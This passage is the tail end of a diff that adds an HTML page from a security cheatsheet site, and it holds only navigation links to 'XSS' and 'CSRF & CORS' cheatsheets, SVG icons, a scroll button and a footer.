+          <nav class="cheatsheet-pager is-split" aria-label="Sibling cheatsheet navigation"><a class="cheatsheet-pager-link is-prev" href="/cheatsheets/web/web08-xss/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Previous</span>
+              <span class="cheatsheet-pager-title">XSS</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a><a class="cheatsheet-pager-link is-next" href="/cheatsheets/web/web09-csrf--cors/">
+            <div class="cheatsheet-pager-copy">
+              <span class="cheatsheet-pager-label">Next</span>
+              <span class="cheatsheet-pager-title">WEB09 CSRF &amp; CORS</span>
+            </div>
+            <span class="cheatsheet-pager-arrow" aria-hidden="true">
+              <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" class="cheatsheet-pager-icon is-next" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+    <path d="m12 19-7-7 7-7"></path>
+    <path d="M19 12H5"></path>
+  </svg>
+            </span>
+          </a></nav>
+        
+      </div>
+    </div>
+  </article>
+  
+
+  </main>
+  <button class="scroll-top-button" type="button" data-scroll-top aria-label="Scroll to top" aria-hidden="true" tabindex="-1">
+    <svg viewBox="0 0 24 24" aria-hidden="true">
+      <path d="M12 18V6"></path>
+      <path d="M6.75 11.25 12 6l5.25 5.25"></path>
+    </svg>
+  </button>
+  <footer class="site-footer">
+  <p>&copy; 2026 JinPwn</p>
+</footer>
+
+</body>
+</html>
